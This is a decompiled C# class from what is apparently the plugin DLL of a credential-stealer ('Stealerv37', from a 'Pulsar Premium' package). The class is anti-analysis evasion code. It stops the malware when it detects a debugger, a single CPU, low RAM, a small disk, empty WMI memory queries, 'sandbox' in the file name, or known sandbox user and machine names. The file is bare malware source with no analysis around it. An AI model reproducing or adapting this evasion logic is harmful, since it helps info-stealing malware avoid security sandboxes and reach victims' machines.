// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.AntiVirtual
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;

#nullable disable
namespace Intelix.Helper;

public static class AntiVirtual
{
  public static void CheckOrExit()
  {
    if (AntiVirtual.ProccessorCheck())
      throw new Exception();
    if (AntiVirtual.CheckDebugger())
      throw new Exception();
    if (AntiVirtual.CheckMemory())
      throw new Exception();
    if (AntiVirtual.CheckDriveSpace())
      throw new Exception();
    if (AntiVirtual.CheckUserConditions())
      throw new Exception();
    if (AntiVirtual.CheckCache())
      throw new Exception();
    if (AntiVirtual.CheckFileName())
      throw new Exception();
    if (AntiVirtual.CheckCim())
      throw new Exception();
  }

  public static bool CheckFileName()
  {
    return Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName).ToLower().Contains("sandbox");
  }

  public static bool ProccessorCheck() => Environment.ProcessorCount <= 1;

  public static bool CheckDebugger() => Debugger.IsAttached;

  public static bool CheckDriveSpace()
  {
    return new DriveInfo("C").TotalSize / 1073741824L /*0x40000000*/ < 50L;
  }

  public static bool CheckCache() => AntiVirtual.CheckCount("Select * from Win32_CacheMemory");

  public static bool CheckCim() => AntiVirtual.CheckCount("Select * from CIM_Memory");

  public static bool CheckCount(string selector)
  {
    return new ManagementObjectSearcher(selector).Get().Count == 0;
  }

  public static bool CheckMemory()
  {
    return Convert.ToDouble(new ManagementObjectSearcher("Select * From Win32_ComputerSystem").Get().Cast<ManagementObject>().FirstOrDefault<ManagementObject>()["TotalPhysicalMemory"]) / 1048576.0 < 2048.0;
  }

  public static bool CheckUserConditions()
  {
    string lower1 = Environment.UserName.ToLower();
    string lower2 = Environment.MachineName.ToLower();
    if (lower1 == "frank" && lower2.Contains("desktop") || lower1 == "WDAGUtilityAccount")
      return true;
    return lower1 == "robert" && lower2.Contains("22h2");
  }
}
